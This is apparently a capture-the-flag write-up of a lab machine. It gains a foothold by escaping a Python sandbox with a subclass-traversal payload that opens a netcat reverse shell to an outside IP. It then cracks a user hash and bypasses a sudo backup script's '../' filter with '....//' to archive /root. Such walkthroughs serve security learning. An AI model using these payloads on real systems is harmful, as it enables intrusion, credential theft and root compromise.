This a pretty straightforward machine that focuses on how to bypass pyjail as well as the ability to read a bash script.

So only two ports are open.

### port 5000
On accessing this page we get a python interpreter

This is most likely a Pyjail case but I tried to dns and subdomain enumeration just in case, but as expected nothing interesting.

## Initial foothold


### Escaping the pyjail
I tried multiple reverse shell codes to get an access on the machine but I get back `Use of restricted keywords is not allowed.`\

So, how to espace it? I stumbled across this [post](https://blog.pepsipu.com/posts/albatross-redpwnctf) explaining how to weaponaize the `__subclasses__` function to traverse the python class hierarchy in order to 
access other modules.

after trying different things I came up with this
```
().__class__.__base__.__subclasses__()[317](["/bin/bash", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.55 4444 >/tmp/f"])
```
Index 317 is referencing to `subprocess.Popen`, which allows spawning system processes.

after trying this we get a shell as `app-production`
![image](/assets/img/CTFs/Code/2.png)
and the user flag is right there.

## Getting shell as martin
I noticed that there was another user `martin` but I cannot access it with the `app-production` privileges. So I started to explore the files under the `app` directory and I found a file called `database.db`. I downloaded it on my host machine and opened it using `sqlite3`
![image](/assets/img/CTFs/Code/3.png) and got a hash for `martin`. went to [crackstation](https://crackstation.net/) and I got the martin password.

SSH into the machine using martin password

## PrivEsc
I got in and there was a directory called `backups` which got some compressed files and a `task.json`. I viewed this file 
``` json
{
        "destination": "/home/martin/backups/",
        "multiprocessing": true,
        "verbose_log": false,
        "directories_to_archive": [
                "/home/app-production/app"
        ],

        "exclude": [
                ".*"
        ]
}
```
I started to think that might be a script that compress these files, so I tried `sudo -l` and indeed there was a script that I can run as root.
![image](/assets/img/CTFs/Code/5.png)

examining `backy.sh`:
```bash
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 <task.json>"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/")

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file")

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
```
So this explains why there is some archives in `backups` directory. if we can manage to get the script to archive the directories under `/root` we will be able to read the root flag.

But it only accept archiving from `/var` and `/home` AND escaping `../` to prevent directory traversal.

I tried to write this to task.json and it worked!
```json
 {
   "destination": "/home/martin/backups/",
   "multiprocessing": true,
   "verbose_log": true,
   "directories_to_archive": [
     "/var/....//root/"
   ]
 }
```
I added extra `../` to bypass the check of directory traversal and used `/var` approach to bypass the check for `/var` or `/home` path
![image](/assets/img/CTFs/Code/6.png)
unzip the `code_var_.._root_2025_March.tar.bz2` file and read the `root.txt`
![image](/assets/img/CTFs/Code/7.png)
Additionally, I could have read the `.ssh/id_rsa` to SSH as root.
